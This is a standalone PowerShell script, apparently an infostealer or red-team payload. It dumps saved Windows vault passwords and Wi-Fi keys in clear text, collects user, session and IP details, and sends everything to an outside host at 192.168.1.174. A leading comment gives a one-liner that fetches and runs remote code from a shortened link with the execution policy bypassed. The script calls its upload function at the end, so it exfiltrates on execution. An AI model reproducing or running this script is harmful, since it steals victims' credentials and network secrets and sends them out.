#powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://bit.ly/2El9Fyw’)"

function Getcred {
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
}

function Getwifi {
$output = netsh.exe wlan show profiles
$profileRows = $output | Select-String -Pattern 'All User Profile'
$profileNames = New-Object System.Collections.ArrayList
for($i = 0; $i -lt $profileRows.Count; $i++){
    $profileName = ($profileRows[$i] -split ":")[-1].Trim()
    
    $profileOutput = netsh.exe wlan show profiles name="$profileName" key=clear
    
    $SSIDSearchResult = $profileOutput| Select-String -Pattern 'SSID Name'
    $profileSSID = ($SSIDSearchResult -split ":")[-1].Trim() -replace '"'

    $passwordSearchResult = $profileOutput| Select-String -Pattern 'Key Content'
    if($passwordSearchResult){
        $profilePw = ($passwordSearchResult -split ":")[-1].Trim()
    } else {
        $profilePw = ''
    }
    $networkObject = New-Object -TypeName psobject -Property @{
        ProfileName = $profileName
        SSID = $profileSSID
        Password = $profilePw
    }
    $profileNames.Add($networkObject)
}
$profileNames | Sort-Object ProfileName | Select-Object ProfileName, SSID, Password
}

function sysinfo {
$date = (Get-Date) 
$user = Whoami
$localusers = Get-LocalUser
$sessions = query user
$env:HostIP = ( `
    Get-NetIPConfiguration | `
    Where-Object { `
        $_.IPv4DefaultGateway -ne $null `
        -and `
        $_.NetAdapter.Status -ne "Disconnected" `
    } `
).IPv4Address.IPAddress
$user
$localusers
$sessions
$env:HostIP
}

function upload {
$Url = "http://192.168.1.174/creds"
$Body = @{
    cred=Getcred
    wifi=Getwifi
    sysinfo=sysinfo
    users=$user
    ip=$env:HostIP
    creds=$creds
}
Invoke-RestMethod -Method 'Get' -Uri $url -Body $body -OutFile output.csv
}

#Getcred
#Getwifi
#sysinfo
#Gethostinfo
upload
